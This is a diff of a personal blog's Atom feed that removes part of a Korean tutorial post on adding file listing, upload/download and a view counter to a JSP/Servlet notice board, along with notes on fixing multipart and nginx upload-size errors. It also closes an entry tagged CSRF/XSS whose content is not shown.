-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">files</span> <span class="o">=</span> <span class="n">folder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">();</span> <span class="c1">// 파일들</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">files</span><span class="o">)</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileName</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">hrefPrameter</span> <span class="o">=</span> <span class="n">folderName</span><span class="o">+</span><span class="s">"%2F"</span><span class="o">+</span><span class="n">fileName</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fileNameList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;(</span><span class="n">fileName</span><span class="o">,</span><span class="n">hrefPrameter</span><span class="o">));</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">,</span> <span class="n">fileNameList</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"noticeBoardFileDownload"</span><span class="o">,</span> <span class="n">noticeBoardFileDownload</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일들 읽어 오기 end ***</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"notice"</span><span class="o">,</span> <span class="n">notice</span><span class="o">);</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">()</span> <span class="o">==</span> <span class="n">notice</span><span class="o">.</span><span class="na">getUserSID</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"modifyButton"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"modifyHref"</span><span class="o">,</span> <span class="n">noticeBoardModify</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"deleteHref"</span><span class="o">,</span> <span class="n">noticeBoardDelete</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">gotoForwardPage</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="s">"/WEB-INF/main_page/notice_board/notice_detail.jsp"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<h2 id="공통-코드">공통 코드</h2>
-<ul>
-  <li>MainPage.java 의 getFilePath 함수</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="nc">String</span> <span class="nf">getFilePath</span><span class="o">(</span><span class="nc">ServletRequest</span> <span class="n">request</span><span class="o">,</span><span class="nc">String</span> <span class="n">folderName</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getRealPath</span><span class="o">(</span><span class="s">"/WEB-INF/upload_folder/"</span><span class="o">+</span><span class="n">folderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">path</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<h2 id="게시글-조회수">게시글 조회수</h2>
-<h3 id="db">DB</h3>
-<ul>
-  <li>조회수 컬럼(views 컬럼) 게시판 테이블에 추가.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0bb3c436-e605-4a3b-9e26-7ace9089fec5" alt="Pasted image 20230525034420" /></li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alter table notice_board add views number(20) default 0 not null;
-
-# 조회수 값 1 증가 하기.
-update notice_board set views = 1 where sid=101;
-</code></pre></div></div>
-
-<h3 id="jsp-3">JSP</h3>
-<h4 id="설명-6">설명</h4>
-<ul>
-  <li>사용자가 게시글 방문하면 게시글 조회수는 1 증가한다.</li>
-  <li>사용자는 게시글의 조회수를 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8eb01948-7e41-4ff0-88e5-d9c93e6ff193" alt="Pasted image 20230525041326" /></li>
-</ul>
-
-<h4 id="과정-6">과정</h4>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7Iuc7YKk6riwXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-<ol>
-  <li>사용자는 서버로 게시글 페이지를 요청한다.</li>
-  <li>서버에서 게시글 조회수를 1 증가 시킨다.</li>
-  <li>게시글 페이지를 완성하여 사용자에게 전달한다.</li>
-</ol>
-
-<h4 id="코드--noticejsp--1">코드 ( notice.jsp )</h4>
-
-<ul>
-  <li>조회수 가져오기</li>
-  <li>notice는 servlet 에서 가져온 것이다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%=</span><span class="n">notice</span><span class="o">.</span><span class="na">getViews</span><span class="o">()</span> <span class="nt">%&gt;</span>
-</code></pre></div></div>
-
-<h3 id="servlet-3">Servlet</h3>
-<h4 id="설명-7">설명</h4>
-<ul>
-  <li>사용자가 게시글에 방문하면 table의 조회수 값을 1증가 시킨다.</li>
-</ul>
-
-<h4 id="과정-7">과정</h4>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7J2R64u1XG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-<ol>
-  <li>사용자는 서버로 게시글 페이지를 요청한다.</li>
-  <li>서버는 DB 서버의 게시판 테이블에 조회수 값을 1증가 시켜 저장한다.</li>
-  <li>서버는 게시글 페이지를 완성하여 사용자에게 전달한다.</li>
-</ol>
-
-<h4 id="코드--mainpagejava--1">코드 ( MainPage.java )</h4>
-
-<ul>
-  <li>조회수 1 증가 하기</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 자세히 보기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDetail</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 조회수 1 증가 시키기.</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSID</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">incressViews</span><span class="o">(</span><span class="n">noticeSID</span><span class="o">,</span> <span class="n">notice</span><span class="o">.</span><span class="na">getViews</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">notice</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">getNotice</span><span class="o">(</span><span class="n">noticeSID</span><span class="o">);</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">notice</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 조회수 증가 end</span>
-</code></pre></div></div>
-
-<h4 id="코드--noticejava">코드 ( Notice.java)</h4>
-<ul>
-  <li>조회수 부분을 추가하였다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Notice</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">long</span> <span class="n">views</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nf">Notice</span><span class="o">(</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...,</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">views</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">getViews</span><span class="o">(){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">views</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-</code></pre></div></div>
-
-<h4 id="코드--noticeboarddaojava-">코드 ( NoticeBoardDAO.java )</h4>
-<ul>
-  <li>DB의 게시판 테이블에 저장된 조회수 값을 1 증가시킨다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
-<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="c1">// 조회수 1 카운트 증가시키기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">incressViews</span><span class="o">(</span><span class="kt">long</span> <span class="n">sid</span><span class="o">,</span> <span class="kt">long</span> <span class="n">currentViews</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"update notice_board set views = "</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">currentViews</span><span class="o">+</span><span class="mi">1</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where sid="</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">sid</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sid</span><span class="o">+</span><span class="s">" 글 조회수 업데이트 : "</span><span class="o">+</span><span class="n">re</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">sid</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<h2 id="발생한-오류">발생한 오류</h2>
-<ul>
-  <li>Unable to process parts as no multi-part configuration has been provided</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var parts = request.getParts();
-Unable to process parts as no multi-part configuration has been provided
-
-web.xml 에 &lt;multipart-config&gt; 설정을 해 줘야 한다.
-</code></pre></div></div>
-
-<ul>
-  <li>413 Request Entity Too Large</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nginx.conf
-http {
-	client_max_body_size 6M;
-	...
-}
-</code></pre></div></div>
-
-<h2 id="후기">후기</h2>
-<ul>
-  <li>직접 업로드와 다운로드 기능을 만들면서 어떤 방식으로 동작하는지 알 수 있는 계기가 되었다. 특히 다운로드 기능을 구현할 때 인코딩 에러가 발생하여 당황스러웠지만 응답 헤더를 고치니 해결되어 다행이었다.</li>
-  <li>조회수를 구현은 생각보다 간단하였다.</li>
-</ul>
-
-<h2 id="참고-사이트">참고 사이트</h2>
-
-<ul>
-  <li><a href="https://coding-factory.tistory.com/284">Java 자바로 폴더(디렉토리) 삭제하기(하위파일, 폴더 포함) (tistory.com)</a></li>
-  <li><a href="https://coding-factory.tistory.com/283">Java 자바로 폴더(디렉토리) 생성하기 (tistory.com)</a></li>
-  <li><a href="https://hianna.tistory.com/589">Java 파일, 디렉토리 존재 여부 확인하기 - 어제 오늘 내일 (tistory.com)</a></li>
-  <li><a href="https://dololak.tistory.com/726">코끼리를 냉장고에 넣는 방법 :: 서블릿/JSP Servlet 3.0에서 Part API를 통한 파일업로드 구현하기 (tistory.com)</a></li>
-  <li><a href="https://www.geeksforgeeks.org/how-to-add-file-uploads-function-to-a-webpage-in-html/">How to add file uploads function to a webpage in HTML ? - GeeksforGeeks</a></li>
-  <li><a href="https://bloghelloworld.tistory.com/398">HTTP GET 방식으로 서버에 요청하기 (작성중) (tistory.com)</a></li>
-  <li><a href="https://dlee0129.tistory.com/214">자바(JAVA) - 폴더 파일명 변경 (tistory.com)</a></li>
-  <li><a href="https://webdir.tistory.com/435">WEBDIR :: 폼 필드(input type=”file”) 디자인 #4 (tistory.com)</a></li>
-  <li><a href="https://hhyemi.github.io/2020/11/05/11051627.html">JavaScript - 파일 용량 제한 - CODE:H (hhyemi.github.io)</a></li>
-  <li><a href="https://bloghelloworld.tistory.com/400">fetch()로 원격 API 호출하기 (tistory.com)</a></li>
-  <li><a href="https://lee1535.tistory.com/30">Javascript/Jquery TABLE 행 추가, 삭제, 체크된 table row 삭제 방법 (tistory.com)</a></li>
-  <li><a href="https://5bong2-develop.tistory.com/106">JavaScript - JSON 데이터 변환, 추출, 원하는 데이터 찾기 (tistory.com)</a></li>
-  <li><a href="https://developer.mozilla.org/ko/docs/Web/API/Fetch_API/Using_Fetch">Fetch 사용하기 - Web API MDN (mozilla.org)</a></li>
-  <li><a href="https://kwonnam.pe.kr/wiki/java/servlet/download">java:servlet:download 권남 (kwonnam.pe.kr)</a></li>
-  <li><a href="https://server-talk.tistory.com/183">MIME이란 무엇인가? (tistory.com)</a></li>
-  <li><a href="https://blog.leocat.kr/notes/2020/04/21/nginx-413-request-entity-too-large">nginx 413 Request Entity Too Large 오류 (leocat.kr)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="oracle db" /><category term="servlet" /><category term="jsp" /><category term="nginx" /><summary type="html"><![CDATA[업로드 다운로드 조회수 기능 만들기.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="csrf" /><category term="xss" /><summary type="html"><![CDATA[CSRF 실습 문제 풀어보기]]></summary></entry></feed>
